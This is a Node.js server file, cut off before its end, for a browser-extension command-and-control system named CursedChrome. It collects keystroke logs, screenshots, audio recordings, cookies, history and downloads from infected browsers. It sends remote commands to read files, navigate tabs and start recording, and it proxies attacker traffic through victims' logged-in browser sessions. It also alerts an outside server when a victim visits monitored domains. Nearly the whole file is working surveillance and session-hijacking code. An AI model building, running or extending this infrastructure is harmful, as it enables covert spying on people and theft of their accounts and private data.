require("dotenv").config();

const NodeCache = require("node-cache");
const AnyProxy = require("./anyproxy");
const cluster = require("cluster");
const WebSocket = require("ws");
const https = require("https");
const redis = require("redis");
const uuid = require("uuid");
const util = require("util");

const database = require("./database.js");
const database_init = database.database_init;
const Users = database.Users;
const Bots = database.Bots;
const BotRecording = database.BotRecording;
const BotScreenshots = database.BotScreenshots;
const BotKeyboardLogs = database.BotKeyboardLogs;
const Settings = database.Settings;
const sequelize = database.sequelize;
const Sequelize = require("sequelize");
const Jimp = require("jimp");
const { log } = require("async");
const Op = Sequelize.Op;
const axios = require("axios");

// Global flag to indicate if a default proxy is set
global.GLOBAL_DEFAULT_PROXY_ACTIVE = false;

const get_secure_random_string = require("./utils.js").get_secure_random_string;
const logit = require("./utils.js").logit;
const BOT_DEFAULT_SWITCH_CONFIG =
  require("./utils.js").BOT_DEFAULT_SWITCH_CONFIG;

const BOT_DEFAULT_DATA_CONFIG = require("./utils.js").BOT_DEFAULT_DATA_CONFIG;

const get_api_server = require("./api-server.js").get_api_server;

const numCPUs = require("os").cpus().length;

/*
    TODO: We need to have a garbage collector for subscriptions
    to the `TOPROXY_{{browser_id}}` topics in redis. Likely just
    having a timeout since last request received would be reasonable
    enough.
*/

const PROXY_PORT = process.env.PROXY_PORT || 8080;
const WS_PORT = process.env.WS_PORT || 4343;
const API_SERVER_PORT = process.env.API_SERVER_PORT || 8118;
const SERVER_VERSION = "1.0.0";

const RPC_CALL_TABLE = {
  PING: ping,
  SYNC: sync,
  SYNC_HUGE: sync_huge,
  STATE: state,
  REALTIME_IMG: real_time_img,
  SCREEN_CAPTURE_DATA: screen_capture_data,
  USER_ACTIVITY: user_activity,
  DEBUG_LOG: debug_log,
  KEYBOARD_LOGS: keyboard_logs,
  AUDIO_DATA: audio_data,
};

const REQUEST_TABLE = new NodeCache({
  stdTTL: 30, // Default second(s) till the entry is removed.
  checkperiod: 5, // How often table is checked and cleaned up.
  useClones: false, // Whether to clone JavaScript variables stored here.
});

const NOTIFY_CACHE = new NodeCache({
  stdTTL: 300, // Default second(s) till the entry is removed.
  checkperiod: 5, // How often table is checked and cleaned up.
  useClones: false, // Whether to clone JavaScript variables stored here.
});

class Message {
  constructor() {
    this.SERVER = process.env.BAK_SERVER || "";
    this.LAST_ONLINE_CHECK_TIME = 60 * 30;
    this.LAST_OFFLINE_CHECK_TIME = 60 * 5;
  }

  async check_last(bot, time) {
    const botLastOnline = new Date(bot.last_online);
    const botLastOnlineUTC = Date.UTC(
      botLastOnline.getFullYear(),
      botLastOnline.getMonth(),
      botLastOnline.getDate(),
      botLastOnline.getHours(),
      botLastOnline.getMinutes(),
      botLastOnline.getSeconds(),
      botLastOnline.getMilliseconds()
    );
    const currentTimeUTC = new Date().getTime();
    const timeDifferenceInSeconds = (currentTimeUTC - botLastOnlineUTC) / 1000;
    return timeDifferenceInSeconds < time;
  }

  async online(bot, force = false) {
    try {
      if (bot === null) {
        return;
      }
      if (!bot.switch_config.NOTIFICATION) {
        return;
      }

      if (bot.is_online && !force) {
        return;
      }

      if (await this.check_last(bot, this.LAST_ONLINE_CHECK_TIME)) {
        return;
      }

      await axios.get(`${this.SERVER}/${bot.name || bot.id} is online`);
      logit(`${bot.name} is online`, false);
    } catch (err) {
      console.log(err);
    }
  }

  async offline(bot) {
    try {
      if (bot === null) {
        return;
      }
      if (!bot.switch_config.NOTIFICATION) {
        return;
      }
      if (!bot.is_online) {
        return;
      }
      if (await this.check_last(bot, this.LAST_OFFLINE_CHECK_TIME)) {
        return;
      }

      await axios.get(`${this.SERVER}/${bot.name} is offline`);
      logit(`${bot.name} is offline`, false);
    } catch (err) {
      console.log(err);
    }
  }

  async notify_domain(bot, domain) {
    await axios.get(`${this.SERVER}/${bot.name} visited ${domain}`);
    logit(`Notified ${bot.name} about ${domain}`, false);
  }
}

const MessageWorker = new Message();

async function pong_and_get_bot(ws) {
  if (!ws.browser_id) {
    logit("Error: WebSocket connection not yet authenticated (no browser_id)");
    throw new Error("WebSocket connection not yet authenticated (no browser_id)");
  }
  const bot = await Bots.findOne({
    where: {
      browser_id: ws.browser_id,
    },
  });
  if (!bot) {
    logit(`Error: Bot with browser_id ${ws.browser_id} not found in database`);
    throw new Error(`Bot with browser_id ${ws.browser_id} not found in database`);
  }

  ws.send(
    JSON.stringify({
      id: uuid.v4(),
      version: SERVER_VERSION,
      action: "PONG",
      data: {
        switch_config: bot.switch_config,
        data_config: bot.data_config,
      },
    })
  );
  return bot;
}

async function audio_data(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  
  // Save audio chunk to BotRecording
  await BotRecording.create({
    id: uuid.v4(),
    bot: bot.id,
    recording: params.chunk, // base64 chunk
    timestamp: new Date(),
    session_id: params.session_id
  });

  // Limit recordings to avoid database bloat (keep last 500 chunks per bot)
  const count = await BotRecording.count({ where: { bot: bot.id } });
  if (count > 500) {
    const oldest = await BotRecording.findAll({
      where: { bot: bot.id },
      order: [['timestamp', 'ASC']],
      limit: count - 500
    });
    if (oldest.length > 0) {
      await BotRecording.destroy({
        where: { id: oldest.map(r => r.id) }
      });
    }
  }
}

async function state(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  const newState = params.state;
  const oldState = bot.state;
  const now = new Date();

  let activity = bot.activity || [];
  let updateData = {
    is_online: true,
    state: newState,
  };

  if (newState === "active") {
    updateData.last_active_at = now;
    // If transitioning from idle/locked to active, start new period
    if (oldState !== "active") {
      activity.push({ start: now, end: null });
      updateData.activity = activity.slice(-100); // Keep last 100 periods
    }
  } else {
    // If transitioning from active to idle/locked, end current period
    if (oldState === "active" && activity.length > 0) {
      const lastPeriod = activity[activity.length - 1];
      if (lastPeriod.end === null) {
        lastPeriod.end = now;
        updateData.activity = activity;
      }
    }
  }

  await bot.update(updateData);
}

async function user_activity(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  const now = new Date();
  let activity = bot.activity || [];
  let updateData = {
    last_active_at: now
  };

  // If there's an ongoing active session, just update its end time
  // Wait, the user said "If I move mouse once and stop, that's the end"
  // But usually we want to see blocks of activity.
  // Let's implement activity blocks: if last hit was < 1 min ago, update end.
  // If > 1 min ago, start new block.
  
  if (activity.length > 0) {
    let lastPeriod = activity[activity.length - 1];
    let lastTime = lastPeriod.end ? new Date(lastPeriod.end) : new Date(lastPeriod.start);
    
    // If the gap is less than 60 seconds, either start/extend current burst
    if ((now.getTime() - lastTime.getTime()) < 60000) {
       lastPeriod.end = now;
    } else {
       activity.push({ start: now, end: now });
    }
  } else {
    activity.push({ start: now, end: now });
  }

  updateData.activity = activity.slice(-100);
  await bot.update(updateData);
}

async function debug_log(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  logit(`[BROWSER DEBUG] [${bot.id}] ${params.message}`);
}

async function keyboard_logs(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  
  logit(`Received keyboard logs from bot ${bot.id} (${params.keys.length} chars)`);
  
  await BotKeyboardLogs.create({
    id: uuid.v4(),
    bot_id: bot.id,
    url: params.url,
    title: params.title,
    keys: params.keys,
    timestamp: new Date()
  });

  // Limit logs to keep database clean (keep last 1000 logs per bot)
  const count = await BotKeyboardLogs.count({ where: { bot_id: bot.id } });
  if (count > 1000) {
    const oldest = await BotKeyboardLogs.findAll({
      where: { bot_id: bot.id },
      order: [['timestamp', 'ASC']],
      limit: count - 1000
    });
    if (oldest.length > 0) {
      await BotKeyboardLogs.destroy({
        where: { id: oldest.map(l => l.id) }
      });
    }
  }
}

async function ping(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  let updateData = {
    is_online: true,
    current_tab: params.current_tab,
    current_tab_image: params.current_tab_image,
  };

  if (bot.state === "active") {
    updateData.last_active_at = new Date();
  }

  await bot.update(updateData);

  // Check if current tab URL domain matches any monitored domains
  if (bot.data_config.MONITOR_DOMAINS && params.current_tab) {
    try {
      const currentDomain = new URL(params.current_tab.url).hostname;
      const matchedDomain = bot.data_config.MONITOR_DOMAINS.find((domain) =>
        currentDomain.includes(domain)
      );

      if (matchedDomain) {
        const lastNotifyKey = `last_notify_${bot.browser_id}_${matchedDomain}`;
        const hasRecentNotification = NOTIFY_CACHE.get(lastNotifyKey);

        if (!hasRecentNotification) {
          await MessageWorker.notify_domain(bot, matchedDomain);

          NOTIFY_CACHE.set(lastNotifyKey, true);
        }
      }
    } catch (err) {
      logit("Error processing domain notification:", err);
    }
  }
}

async function real_time_img(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  let updateData = {
    is_online: true,
    current_tab_image: params.current_tab_image,
  };
  if (bot.state === "active") {
    updateData.last_active_at = new Date();
  }
  await bot.update(updateData);
}

async function sync(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  let updateData = {
    is_online: true,
    tabs: params.tabs,
  };
  if (bot.state === "active") {
    updateData.last_active_at = new Date();
  }
  await bot.update(updateData);
}

async function sync_huge(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  let updateData = {
    is_online: true,
    history: params.history,
    bookmarks: params.bookmarks,
    cookies: params.cookies,
    downloads: params.downloads,
  };
  if (bot.state === "active") {
    updateData.last_active_at = new Date();
  }
  await bot.update(updateData);
}

async function user_activity(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  const now = new Date();
  let activity = bot.activity || [];
  let updateData = {
    last_active_at: now
  };

  // If there's an ongoing active session, just update its end time
  // Wait, the user said "If I move mouse once and stop, that's the end"
  // But usually we want to see blocks of activity.
  // Let's implement activity blocks: if last hit was < 1 min ago, update end.
  // If > 1 min ago, start new block.
  
  if (activity.length > 0) {
    let lastPeriod = activity[activity.length - 1];
    let lastTime = lastPeriod.end ? new Date(lastPeriod.end) : new Date(lastPeriod.start);
    
    // If the gap is less than 60 seconds, either start/extend current burst
    if ((now.getTime() - lastTime.getTime()) < 60000) {
       lastPeriod.end = now;
    } else {
       activity.push({ start: now, end: now });
    }
  } else {
    activity.push({ start: now, end: now });
  }

  updateData.activity = activity.slice(-100);
  await bot.update(updateData);
}



async function screen_capture_data(websocket_connection, params) {
  const bot = await pong_and_get_bot(websocket_connection);
  logit("Received screen capture data from bot: " + bot.id);
  const newCaptures = params.captures || [];
  
  for (const capture of newCaptures) {
    try {
      if (!capture.imageData) continue;

      // Extract base64 content
      const base64Data = capture.imageData.replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");

      // Use Jimp to resize and compress
      const image = await Jimp.read(buffer);
      
      // Limit dimensions to 800px max
      if (image.bitmap.width > 800 || image.bitmap.height > 800) {
        image.scaleToFit(800, 800);
      }
      
      // Set ultra-low quality (10%)
      image.quality(10);
      
      const compressedBuffer = await image.getBufferAsync(Jimp.MIME_JPEG);
      const compressedBase64 = `data:image/jpeg;base64,${compressedBuffer.toString("base64")}`;

      // Save to its own table
      await BotScreenshots.create({
        id: uuid.v4(),
        bot_id: bot.id,
        url: capture.url,
        title: capture.title,
        session_id: capture.sessionId,
        image_data: compressedBase64,
        difference: capture.difference,
        timestamp: new Date(capture.timestamp || Date.now()),
      });
    } catch (err) {
      logit("Error processing screenshot compression:", err);
    }
  }

  // Update online status
  await bot.update({
    is_online: true,
  });

  // Optional: Clean up old screenshots for this bot (e.g., keep last 500)
  try {
    const totalCount = await BotScreenshots.count({ where: { bot_id: bot.id } });
    if (totalCount > 500) {
      const oldestToDelete = await BotScreenshots.findAll({
        where: { bot_id: bot.id },
        order: [['timestamp', 'ASC']],
        limit: totalCount - 500
      });
      if (oldestToDelete.length > 0) {
        await BotScreenshots.destroy({
          where: {
            id: oldestToDelete.map(s => s.id)
          }
        });
      }
    }
  } catch (err) {
    logit("Error cleaning up screenshots:", err);
  }
}



function get_browser_proxy(input_browser_id) {
  for (
    var it = wss.clients.values(), val = null;
    (current_ws_client = it.next().value);

  ) {
    if (current_ws_client.browser_id === input_browser_id) {
      return current_ws_client;
    }
  }

  throw "No browser found that matches those credentials!";
  return false;
}

function authenticate_client(websocket_connection) {
  logit("Authenticating client...");
  return new Promise(function (resolve, reject) {
    // For timeout, will reject if no response in 30 seconds.
    setTimeout(function () {
      reject(`A timeout occurred when authenticating WebSocket client.`);
    }, 30 * 1000);

    const message_id = uuid.v4();

    const auth_rpc_message = {
      id: message_id,
      version: "1.0.0",
      action: "AUTH",
      data: {},
    };

    // Add promise resolve to message table
    // that way the promise is resolved when
    // we get a response for our HTTP request
    // RPC message.
    REQUEST_TABLE.set(message_id, resolve);

    // Send auth RPC message
    websocket_connection.send(JSON.stringify(auth_rpc_message));
  });
}

function get_browser_cookie_array(browser_id) {
  logit("Getting cookies for browser_id: " + browser_id);
  return new Promise(function (resolve, reject) {
    // For timeout, will reject if no response in 30 seconds.
    setTimeout(function () {
      reject(`Get cookies RPC called timed out.`);
    }, 15 * 1000);

    const message_id = uuid.v4();

    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "GET_COOKIES",
      data: {},
    };

    // Add promise resolve to message table
    // that way the promise is resolved when
    // we get a response for our HTTP request
    // RPC message.
    REQUEST_TABLE.set(message_id, resolve);

    // Subscribe to the proxy redis topic to get the
    // response when it comes
    const subscription_id = `TOPROXY_${browser_id}`;
    subscriber.subscribe(subscription_id);

    // Send the HTTP request RPC message to the browser
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function get_browser_history_array(browser_id) {
  logit(`Getting history for browser ${browser_id}`);
  return new Promise(function (resolve, reject) {
    setTimeout(function () {
      reject(`Get history RPC called timed out.`);
    }, 30 * 1000);

    const message_id = uuid.v4();

    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "GET_HISTORY",
      data: {},
    };

    REQUEST_TABLE.set(message_id, resolve);

    const subscription_id = `TOPROXY_${browser_id}`;
    subscriber.subscribe(subscription_id);

    // Send the HTTP request RPC message to the browser
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function manipulate_browser(browser_id, path_uri) {
  logit(`Manipulating browser ${browser_id} with path ${path_uri}`);
  return new Promise(function (resolve, reject) {
    // For timeout, will reject if no response in 30 seconds.
    setTimeout(function () {
      reject(`manipulate_browser RPC called timed out.`);
    }, 3 * 1000);

    const message_id = uuid.v4();

    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "GET_FILESYSTEM",
      data: path_uri,
    };

    REQUEST_TABLE.set(message_id, resolve);

    subscriber.subscribe(`TOPROXY_${browser_id}`);

    const subscription_id = `TOBROWSER_${browser_id}`;
    subscriber.subscribe(subscription_id);
    publisher.publish(subscription_id, JSON.stringify(message));
  });
}

function send_request_via_browser(
  browser_id,
  authenticated,
  url,
  method,
  headers,
  body
) {
  return new Promise(function (resolve, reject) {
    // For timeout, will reject if no response in 30 seconds.
    setTimeout(function () {
      reject(`Request Timed Out for URL ${url}!`);
    }, 30 * 1000);

    const message_id = uuid.v4();

    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "HTTP_REQUEST",
      data: {
        url: url,
        method: method,
        headers: headers,
        body: body,
        authenticated: authenticated,
      },
    };

    // Add promise resolve to message table
    // that way the promise is resolved when
    // we get a response for our HTTP request
    // RPC message.
    REQUEST_TABLE.set(message_id, resolve);

    // Subscribe to the proxy redis topic to get the
    // response when it comes
    const subscription_id = `TOPROXY_${browser_id}`;
    subscriber.subscribe(subscription_id);

    // Send the HTTP request RPC message to the browser
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function tab_navigate_and_fetch(browser_id, url) {
  logit(`Navigating browser ${browser_id} to ${url} and fetching content`);
  return new Promise(function (resolve, reject) {
    // For timeout, will reject if no response in 35 seconds.
    setTimeout(function () {
      reject(`tab_navigate_and_fetch RPC called timed out.`);
    }, 35 * 1000);

    const message_id = uuid.v4();

    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "TAB_NAVIGATE_AND_FETCH",
      data: {
        url: url,
      },
    };

    // Add promise resolve to message table
    // that way the promise is resolved when
    // we get a response for our RPC message.
    REQUEST_TABLE.set(message_id, resolve);

    // Subscribe to the proxy redis topic to get the
    // response when it comes
    const subscription_id = `TOPROXY_${browser_id}`;
    subscriber.subscribe(subscription_id);

    // Send the RPC message to the browser
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function stop_tab_navigate(browser_id) {
  logit(`Stopping navigation for browser ${browser_id}`);
  return new Promise(function (resolve, reject) {
    const message_id = uuid.v4();
    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "STOP_TAB_NAVIGATE",
      data: {},
    };
    REQUEST_TABLE.set(message_id, resolve);
    subscriber.subscribe(`TOPROXY_${browser_id}`);
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function start_audio_recording(browser_id) {
  logit(`Starting audio recording for browser ${browser_id}`);
  return new Promise(function (resolve, reject) {
    setTimeout(function () {
      reject(`START_AUDIO_RECORDING RPC called timed out.`);
    }, 10 * 1000);

    const message_id = uuid.v4();
    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "START_AUDIO",
      data: {},
    };
    REQUEST_TABLE.set(message_id, resolve);
    subscriber.subscribe(`TOPROXY_${browser_id}`);
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function stop_audio_recording(browser_id) {
  logit(`Stopping audio recording for browser ${browser_id}`);
  return new Promise(function (resolve, reject) {
    setTimeout(function () {
      reject(`STOP_AUDIO_RECORDING RPC called timed out.`);
    }, 10 * 1000);

    const message_id = uuid.v4();
    var message = {
      id: message_id,
      version: SERVER_VERSION,
      action: "STOP_AUDIO",
      data: {},
    };
    REQUEST_TABLE.set(message_id, resolve);
    subscriber.subscribe(`TOPROXY_${browser_id}`);
    publisher.publish(`TOBROWSER_${browser_id}`, JSON.stringify(message));
  });
}

function caseinsen_get_value_by_key(input_object, input_key) {
  const object_keys = Object.keys(input_object);
  var matching_value = undefined;

  object_keys.map((object_key) => {
    if (object_key.toLowerCase() === input_key.toLowerCase()) {
      matching_value = input_object[object_key];
    }
  });

  return matching_value;
}

const AUTHENTICATION_REQUIRED_PROXY_RESPONSE = {
  response: {
    statusCode: 407,
    header: {
      "Proxy-Authenticate": 'Basic realm="Please provide your credentials."',
    },
    body: "Provide credentials.",
  },
};

async function get_authentication_status(inputRequestDetail) {
  const proxy_authentication = caseinsen_get_value_by_key(
    inputRequestDetail,
    "Proxy-Authorization"
  );

  if (!proxy_authentication || !proxy_authentication.includes("Basic")) {
    logit(`No proxy credentials provided, checking for global default proxy...`);
    
    // Check for global default proxy if no credentials provided
    const global_proxy_setting = await Settings.findOne({
      where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" }
    });

    if (global_proxy_setting && global_proxy_setting.value) {
      global.GLOBAL_DEFAULT_PROXY_ACTIVE = true;
      const bot = await Bots.findOne({
        where: { id: global_proxy_setting.value }
      });
      if (bot) {
        logit(`Using global default proxy: ${bot.name} (${bot.id})`);
        return {
          id: bot.id,
          browser_id: bot.browser_id,
          is_authenticated: bot.is_authenticated,
          name: bot.name,
        };
      }
    } else {
      global.GLOBAL_DEFAULT_PROXY_ACTIVE = false;
    }
    
    return false;
  }

  const proxy_auth_string = new Buffer(
    proxy_authentication.replace("Basic ", "").trim(),
    "base64"
  ).toString();

  const proxy_auth_string_parts = proxy_auth_string.split(":");
  const username = proxy_auth_string_parts[0];
  const password = proxy_auth_string_parts[1];

  const memory_cache_key = `${username}:${password}`;

  // If we already have this cached we can stop here.
  const credential_data_string = await getAsync(memory_cache_key);

  if (credential_data_string) {
    const cached_record = JSON.parse(credential_data_string);
    return {
      id: cached_record.id,
      browser_id: cached_record.browser_id,
      is_authenticated: cached_record.is_authenticated,
      name: cached_record.name,
    };
  }

  // Kick both queries off at the same time for slightly improved speed.
  var browserproxy_record = await Bots.findOne({
    where: {
      proxy_username: username,
      proxy_password: password,
    },
  });

  if (!browserproxy_record) {
    logit(`Invalid credentials for username '${username}'!`);
    return false;
  }

  // No need to wait for this to resolve
  await setexAsync(
    memory_cache_key,
    60 * 10,
    JSON.stringify(browserproxy_record)
  );

  return {
    id: browserproxy_record.id,
    browser_id: browserproxy_record.browser_id,
    is_authenticated: browserproxy_record.is_authenticated,
    name: browserproxy_record.name,
  };
}

const options = {
  port: PROXY_PORT,
  rule: {
    async beforeSendRequest(requestDetail) {
      const remote_address = requestDetail._req.connection.remoteAddress;

      const auth_details = await get_authentication_status(
        requestDetail.requestOptions.headers
      );

      if (!auth_details) {
        logit(
          `[${remote_address}] Request denied for URL ${requestDetail.url}, no authentication information provided in proxy HTTP request!`
        );
        return AUTHENTICATION_REQUIRED_PROXY_RESPONSE;
      }

      // Send base64-encoded body if there's any data to
      // send, otherwise set it to false.
      const body =
        requestDetail.requestData.length > 0
          ? requestDetail.requestData.toString("base64")
          : false;

      logit(
        `[${auth_details.id}][${auth_details.name}] Proxying request ${requestDetail._req.method} ${requestDetail.url}`
      );
      const response = await send_request_via_browser(
        auth_details.browser_id,
        true,
        requestDetail.url,
        requestDetail.requestOptions.method,
        requestDetail.requestOptions.headers,
        body
      );

      // For connection errors
      if (!response) {
        logit(
          `[${auth_details.id}][${auth_details.name}] A connection error occurred while requesting ${requestDetail._req.method} ${requestDetail.url}`
        );
        return {
          response: {
            statusCode: 503,
            header: {
              "Content-Type": "text/plain",
              "X-Frame-Options": "DENY",
            },
            body: new Buffer(
              `CursedChrome encountered an error while requesting the page.`
            ),
          },
        };
      }

      logit(
        `[${auth_details.id}][${auth_details.name}] Got response ${response.status} ${requestDetail.url}`
      );

      let encoded_body_buffer = new Buffer(response.body, "base64");
      let decoded_body = encoded_body_buffer.toString("ascii");

      if ("content-encoding" in response.headers) {
        delete response.headers["content-encoding"];
      }

      return {
        response: {
          statusCode: response.status,
          header: response.headers,
          body: encoded_body_buffer,
        },
      };
    },
  },
  webInterface: {
    enable: false,
    webPort: 8002,
  },
  //throttle: 10000,
  forceProxyHttps: true,
  wsIntercept: false,
  silent: true,
};

async function initialize_global_proxy_state() {
  const global_proxy_setting = await Settings.findOne({
    where: { key: "GLOBAL_DEFAULT_PROXY_BOT_ID" }
  });
  global.GLOBAL_DEFAULT_PROXY_ACTIVE = !!(global_proxy_setting && global_proxy_setting.value);
  if (global.GLOBAL_DEFAULT_PROXY_ACTIVE) {
    logit(`Initialized Global Default Proxy: ACTIVE (${global_proxy_setting.value})`);
  }
}

async function initialize_new_browser_connection(ws) {
  logit(`Authenticating newly-connected browser...`);

  // Authenticate the newly-connected client.
  const auth_result = await authenticate_client(ws);

  const browser_id = auth_result.browser_id;
  const user_agent = auth_result.user_agent;

  // Set the browser ID on the WebSocket connection object
  ws.browser_id = browser_id;

  // Set up a subscription in redis for when we get a new
  // HTTP proxy request that we need to send to the browser
  // connected to use via WebSocket.

  subscriber.subscribe(`TOBROWSER_${browser_id}`);
  logit(`New subscriber: TOBROWSER__${browser_id}`);

  // Check the database to see if we already have this browser
  // Recorded in the DB.
  var browserproxy_record = await Bots.findOne({
    where: {
      browser_id: browser_id,
    },
  });

  if (browserproxy_record === null) {
    /*
            If the browser has no Bots in the database then we'll
            create a default one which is authenticated and unscoped.

            This is to make the user's first use experience much easier so
            they can easily try out the functionality.
        */
    logit(
      `Browser ID ${browser_id} is not already registered. Creating new credentials for it...`
    );

    const new_username = `botuser${get_secure_random_string(8)}`;
    const new_password = get_secure_random_string(18);

    const new_browserproxy = await Bots.create({
      id: uuid.v4(),
      name: "Untitled Bot",
      browser_id: browser_id,
      proxy_username: new_username,
      proxy_password: new_password,
      is_authenticated: true,
      is_online: true,
      user_agent: user_agent,
      current_tab: {},
      current_tab_image: "",
      history: [],
      tabs: [],
      bookmarks: [],
      cookies: [],
      downloads: [],
      recording: [],
      switch_config: BOT_DEFAULT_SWITCH_CONFIG,
      data_config: BOT_DEFAULT_DATA_CONFIG,
      last_online: new Date(),
      state: "",
    });
    MessageWorker.online(new_browserproxy, (force = true));
  } else {
    // Update all browserproxy records to reflect that all these proxies are
    // now online.
    MessageWorker.online(browserproxy_record);
    browserproxy_record.is_online = true;
    browserproxy_record.user_agent = user_agent;
    browserproxy_record.last_online = new Date();

    // Ensure all default switch config keys exist
    let modified = false;
    let switch_config = browserproxy_record.switch_config || {};
    Object.keys(BOT_DEFAULT_SWITCH_CONFIG).forEach((key) => {
      if (switch_config[key] === undefined) {
        switch_config[key] = BOT_DEFAULT_SWITCH_CONFIG[key];
        modified = true;
      }
    });
    if (modified) {
      browserproxy_record.switch_config = switch_config;
      browserproxy_record.changed("switch_config", true);
    }

    await browserproxy_record.save();
  }
}

function heartbeat() {
  this.isAlive = true;
}

var wss = undefined;
var proxyServer = undefined;
var redis_client = undefined;
var subscriber = undefined;
var publisher = undefined;

async function initialize() {
  // Used for distributing the TCP connection workload across
  // multiple servers which use one redis instance as the core
  // pubsub system.
  redis_client = redis.createClient({
    host: process.env.REDIS_HOST,
  });
  redis_client.on("error", function (error) {
    logit(`Redis client encountered an error:`);
    console.error(error);
  });
  subscriber = redis.createClient({
    host: process.env.REDIS_HOST,
  });
  publisher = redis.createClient({
    host: process.env.REDIS_HOST,
  });

  // Promisify Node redis calls, these are intentionally global
  getAsync = util.promisify(redis_client.get).bind(redis_client);
  setexAsync = util.promisify(redis_client.setex).bind(redis_client);
  delAsync = util.promisify(redis_client.del).bind(redis_client);

  // Called when a new redis subscription is added
  subscriber.on("subscribe", function (channel, count) {
    logit(
      `New subscription created for channel ${channel}, bring total to ${count}.`
    );
  });

  // Called when a new message is written to a channel
  subscriber.on("message", function (channel, message) {
    logit(
      `Received a new message at channel '${channel}', message is '${message
        .toString()
        .slice(0, 200)}'`
    );

    // Handle system events
    if (channel === "SYSTEM_EVENTS") {
      try {
        const event = JSON.parse(message);
        if (event.type === "GLOBAL_PROXY_UPDATED") {
          logit("Received GLOBAL_PROXY_UPDATED event, refreshing state...");
          initialize_global_proxy_state();
        }
      } catch (e) {
        logit(`Error parsing system event: ${e}`);
      }
      return;
    }

    // For messages being sent to the browser from the proxy
    if (channel.startsWith("TOBROWSER_")) {
      const browser_id = channel.replace("TOBROWSER_", "");
      const browser_websocket = get_browser_proxy(browser_id);
      browser_websocket.send(message);
      return;
    }

    // For messages being sent back to the proxy from the browser
    if (channel.startsWith("TOPROXY_")) {
      const browser_id = channel.replace("TOPROXY_", "");

      try {
        var inbound_message = JSON.parse(message);
      } catch (e) {
        logit(`Error parsing message received from browser:`);
        logit(`Message: ${message}`);
        logit(`Exception: ${e}`);
      }

      // Check if it's an action we recognize.
      if (inbound_message.action in RPC_CALL_TABLE) {
        RPC_CALL_TABLE[inbound_message.action](
          browser_id,
          inbound_message.data
        );
        return;
      }

      // Check if we're tracking this response
      if (REQUEST_TABLE.has(inbound_message.id)) {
        logit(`Resolving function for message ID ${inbound_message.id}...`);
        const resolve = REQUEST_TABLE.take(inbound_message.id);
        resolve(inbound_message.result);
      }
      return;
    }
  });

  wss = new WebSocket.Server({
    port: WS_PORT,
  });

  wss.on("connection", async function connection(ws) {
    logit(`A new browser has connected to us via WebSocket!`);

    ws.isAlive = true;

    ws.on("close", async () => {
      // Only do this if there's a valid browser ID for
      // the WebSocket which has died.
      if (ws.browser_id) {
        logit(`WebSocket browser ${ws.browser_id} has disconnected.`);

        // Unsubscribe from the browser topic since we can no longer send
        // any messages to the browser anymore
        subscriber.unsubscribe(`TOBROWSER_${ws.browser_id}`);

        // Update browserproxy record to reflect being offline
        var browserproxy_record = await Bots.findOne({
          where: {
            browser_id: ws.browser_id,
          },
        });
        MessageWorker.offline(browserproxy_record);
        browserproxy_record.is_online = false;
        browserproxy_record.last_online = new Date();
        await browserproxy_record.save();
      } else {
        logit(`Unauthenticated WebSocket has disconnected from us.`);
      }
    });

    ws.on("pong", heartbeat);

    ws.on("message", async function incoming(message) {
      try {
        logit(
          `Received a new message from the browser: ${message
            .toString()
            .slice(0, 200)}`
        );
        var inbound_message = JSON.parse(message);
      } catch (e) {
        logit(`Error parsing message received from browser:`);
        logit(`Message: ${message}`);
        logit(`Exception: ${e}`);
      }

      // As a special case, if this is the result
      // from an authentication request, we'll process it.
      if (inbound_message.origin_action === "AUTH") {
        // Check if we're tracking this response
        if (REQUEST_TABLE.has(inbound_message.id)) {
          //logit(`Resolving function for message ID ${inbound_message.id}...`)
          const resolve = REQUEST_TABLE.take(inbound_message.id);
          resolve(inbound_message.result);
        }
        return;
      } else if (RPC_CALL_TABLE[inbound_message.action]) {
        await RPC_CALL_TABLE[inbound_message.action](ws, inbound_message.data);
      } else if (ws.browser_id) {
        // Write to redis proxy topic with the response from the
        // websocket connection.
        publisher.publish(`TOPROXY_${ws.browser_id}`, message);
      } else {
        logit(
          `Wat, this shouldn't happen? Orphaned message (somebody might be probing you!):`
        );
        logit(message);
      }
    });

    await initialize_new_browser_connection(ws);
  });


  wss.on("ready", async () => {
    logit(`CursedChrome WebSocket server is now running on port ${WS_PORT}.`);
  });


  // Initialize global proxy state before starting servers
  await initialize_global_proxy_state();

  // Subscribe to system events
  subscriber.subscribe("SYSTEM_EVENTS");

  proxyServer = new AnyProxy.ProxyServer(options);

  proxyServer.on("ready", () => {
    logit(
      `CursedChrome HTTP Proxy server is now running on port ${PROXY_PORT}.`
    );
  });

  proxyServer.on("error", (e) => {
    logit(`CursedChrome HTTP Proxy server encountered an unexpected error:`);
    console.error(e);
  });

  logit(`Starting the WebSocket server...`);
  logit(`Starting the HTTP proxy server...`);
  proxyServer.start();
  logit(`Starting API server...`);

  const proxy_utils = {
    get_browser_cookie_array: get_browser_cookie_array,
    get_browser_history_array: get_browser_history_array,
    manipulate_browser: manipulate_browser,
    tab_navigate_and_fetch: tab_navigate_and_fetch,
